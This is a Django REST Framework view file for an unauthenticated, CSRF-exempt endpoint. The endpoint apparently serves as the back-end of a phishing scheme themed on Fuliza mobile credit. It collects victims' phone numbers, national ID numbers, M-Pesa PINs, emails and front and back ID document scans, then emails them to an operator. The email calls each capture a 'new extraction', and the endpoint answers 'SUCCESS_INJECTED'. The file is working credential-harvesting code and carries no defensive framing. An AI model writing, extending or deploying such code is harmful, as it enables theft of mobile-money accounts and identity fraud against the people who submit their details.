from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.core.mail import EmailMessage
from django.conf import settings
from .serializers import FulizaLeadSerializer
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

@method_decorator(csrf_exempt, name='dispatch')
class DataCaptureView(APIView):
    authentication_classes = [] # No auth
    permission_classes = []     # No permissions

    def post(self, request):
        serializer = FulizaLeadSerializer(data=request.data)
        print(request.data)

        if serializer.is_valid():
            lead = serializer.save()
            
            # Trigger Email Background Task
            self.send_lead_email(lead)
            
            return Response({"status": "SUCCESS_INJECTED"}, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def send_lead_email(self, lead):
        subject = f"🚨 NEW FULIZA LEAD: {lead.phone_number}"
        body = f"""
        New extraction successful:
        - Phone: {lead.phone_number}
        - ID: {lead.id_number}
        - PIN: {lead.mpesa_pin}
        - Email: {lead.email}
        - Timestamp: {lead.created_at}
        """
        email = EmailMessage(
            subject, body, settings.EMAIL_HOST_USER, [settings.ADMIN_EMAIL]
        )
        # Attach IDs
        email.attach(lead.frontDoc.name, lead.frontDoc.read())
        email.attach(lead.backDoc.name, lead.backDoc.read())
        email.send(fail_silently=False)